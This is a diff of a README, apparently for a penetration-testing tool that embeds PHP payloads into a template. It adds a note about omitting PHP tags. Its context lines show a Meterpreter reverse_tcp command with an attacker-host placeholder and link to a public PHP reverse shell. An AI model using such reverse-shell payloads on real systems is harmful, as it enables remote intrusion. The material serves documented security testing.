@@ -36,6 +36,8 @@ $ msfconsole -p php/meterpreter/reverse_tcp LHOST=<attacker_host LPORT=<listenin
 
 Any valid PHP will work, including traditional PHP reverse shell payloads such as this one: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php.
 
+Note: the payload is inserted into a PHP template. There is no need to include PHP opening and closing tags.
+
 Good luck!
 
 ## Similar Projects
